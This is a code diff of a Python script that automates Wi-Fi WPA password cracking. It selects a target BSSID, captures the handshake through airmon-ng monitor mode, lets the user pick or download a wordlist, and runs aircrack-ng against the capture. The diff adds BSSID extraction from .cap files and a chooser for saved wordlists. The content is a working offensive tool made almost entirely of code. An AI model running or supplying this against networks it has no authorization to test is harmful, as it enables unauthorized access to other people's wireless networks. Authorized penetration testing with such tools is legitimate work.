@@ -109,14 +109,66 @@ def capture_handshake(bssid, channel, interface):
         print(colored("[!] No handshake file captured.", "red"))
         return None
 
+def extract_bssid_from_cap(cap_file):
+    try:
+        print(colored("[*] Extracting BSSID from the .cap file...", "yellow"))
+        result = subprocess.run(
+            ["aircrack-ng", cap_file],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True
+        )
+        output = result.stdout
+
+        # Use regex to extract the BSSID (MAC address format)
+        bssid_match = re.search(r"([0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5})", output)
+        if bssid_match:
+            bssid = bssid_match.group(1)
+            print(colored(f"[+] Extracted BSSID: {bssid}", "green"))
+            return bssid
+        else:
+            print(colored("[!] Failed to extract BSSID from the .cap file.", "red"))
+            return None
+    except Exception as e:
+        print(colored(f"[!] Error extracting BSSID: {e}", "red"))
+        return None
+
 def choose_wordlist():
-    print(colored("\n[1] Use rockyou.txt", "magenta"))
+    print(colored("\n[1] Choose from saved wordlists", "magenta"))
     print(colored("[2] Generate a custom wordlist", "magenta"))
     print(colored("[3] Download an online wordlist", "magenta"))
     choice = input(colored("[?] Choose wordlist option: ", "blue"))
-    
+
     if choice == '1':
-        return "/usr/share/wordlists/rockyou.txt"  
+        wordlist_dir = "/usr/share/wordlists/"
+        if not os.path.isdir(wordlist_dir):
+            print(colored("[!] Wordlist directory not found. Please ensure wordlists are installed.", "red"))
+            return None
+
+        # List all available wordlists in the directory
+        wordlists = [f for f in os.listdir(wordlist_dir) if os.path.isfile(os.path.join(wordlist_dir, f))]
+        if not wordlists:
+            print(colored("[!] No wordlists found in the system. Please add wordlists to /usr/share/wordlists/.", "red"))
+            return None
+
+        print(colored("\n[*] Available wordlists:", "magenta"))
+        for idx, wordlist in enumerate(wordlists, start=1):
+            print(colored(f"[{idx}] {wordlist}", "cyan"))
+
+        # Prompt the user to select a wordlist
+        try:
+            selected_idx = int(input(colored("[?] Choose a wordlist by number: ", "blue")).strip())
+            if 1 <= selected_idx <= len(wordlists):
+                selected_wordlist = os.path.join(wordlist_dir, wordlists[selected_idx - 1])
+                print(colored(f"[+] Selected wordlist: {selected_wordlist}", "green"))
+                return selected_wordlist
+            else:
+                print(colored("[!] Invalid choice. Please select a valid number.", "red"))
+                return None
+        except ValueError:
+            print(colored("[!] Invalid input. Please enter a number.", "red"))
+            return None
+
     elif choice == '2':
         keywords = input(colored("[?] Enter keywords (comma-separated): ", "blue")).strip().split(",")
         keywords = [kw.strip() for kw in keywords if kw.strip()]
@@ -129,6 +181,7 @@ def choose_wordlist():
         filename = "custom_wordlist.txt"
         save_to_file(wordlist, filename)
         return filename
+
     elif choice == '3':
         print(colored("[*] Downloading an online wordlist...", "yellow"))
         wordlist_url = input(colored("[?] Enter the URL of the wordlist: ", "blue")).strip()
@@ -140,33 +193,51 @@ def choose_wordlist():
         except subprocess.CalledProcessError:
             print(colored("[!] Failed to download the wordlist. Please check the URL.", "red"))
             return None
+
     else:
-        print(colored("[!] Invalid choice. Defaulting to rockyou.txt", "red"))
-        return "/usr/share/wordlists/rockyou.txt"
+        print(colored("[!] Invalid choice. Please select a valid option.", "red"))
+        return None
 
 def main():
     print_banner()
 
-    bssid, channel = detect_bssid()
-    if not bssid or not channel:
-        return
+    # Ask the user if they want to use an existing .cap file
+    use_existing_cap = input(colored("[?] Do you want to use an existing .cap file? (y/n): ", "blue")).strip().lower()
+    if use_existing_cap == 'y':
+        handshake = input(colored("[?] Enter the full path to the .cap file: ", "blue")).strip()
+        if not os.path.isfile(handshake):
+            print(colored("[!] Invalid .cap file path. Exiting...", "red"))
+            return
+        print(colored(f"[+] Using existing .cap file: {handshake}", "green"))
 
-    print(colored(f"[*] Targeting BSSID: {bssid} on Channel: {channel}", "cyan"))
+        # Extract the BSSID from the .cap file
+        bssid = extract_bssid_from_cap(handshake)
+        if not bssid:
+            print(colored("[!] Could not extract BSSID. Exiting...", "red"))
+            return
+    else:
+        # Proceed with handshake capture
+        bssid, channel = detect_bssid()
+        if not bssid or not channel:
+            return
 
-    handshake = capture_handshake(bssid, channel, "wlan0mon")
-    if not handshake:
-        print(colored(f"[!] Failed to capture handshake. Exiting...", "red"))
-        return
+        print(colored(f"[*] Targeting BSSID: {bssid} on Channel: {channel}", "cyan"))
+        handshake = capture_handshake(bssid, channel, "wlan0mon")
+        if not handshake:
+            print(colored(f"[!] Failed to capture handshake. Exiting...", "red"))
+            return
 
-    print("\n[*] Stopping monitor mode...")
-    subprocess.run(["airmon-ng", "stop", "wlan0mon"])
+        print("\n[*] Stopping monitor mode...")
+        subprocess.run(["airmon-ng", "stop", "wlan0mon"])
 
+    # Choose a wordlist
     print("\n[*] Choosing a wordlist...")
     wordlist_path = choose_wordlist()
     while not wordlist_path or not os.path.isfile(wordlist_path):
         print(colored(f"[!] Invalid wordlist selection. Please choose again.", "red"))
         wordlist_path = choose_wordlist()
 
+    # Automatically run aircrack-ng with the selected wordlist
     print(colored("\n[*] Starting aircrack-ng to crack the handshake...", "yellow"))
     try:
         subprocess.run(["aircrack-ng", "-w", wordlist_path, "-b", bssid, handshake], check=True)
